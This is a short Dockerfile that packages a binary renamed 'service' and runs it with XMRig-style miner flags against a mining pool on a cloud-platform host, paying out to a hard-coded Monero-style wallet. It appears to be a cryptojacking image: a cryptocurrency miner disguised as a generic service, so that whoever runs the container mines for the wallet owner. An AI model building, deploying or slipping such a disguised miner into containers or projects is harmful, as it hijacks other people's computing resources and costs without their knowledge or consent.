FROM alpine:latest


RUN mkdir -p /usr/local/bin/service
COPY service /usr/local/bin/service
RUN chmod +x /usr/local/bin/service

WORKDIR /usr/local/bin/service

ENV WALLET=48y8ss2ujR8NTDcSLkuatw4timoRdscmhKzSMwmqvbCy6wCVMBzPGwKM3m9e261rczHBkdADi8NTG4nwd4Ww2CfeVbsNDsy
ENV POOL=node3642-env-5341988.user.kcmopaas.com:11000
ENV WORKER_NAME=x

CMD ["sh", "-c", "./service --url=$POOL --donate-level=1 --user=$WALLET --pass=$WORKER_NAME -k"]
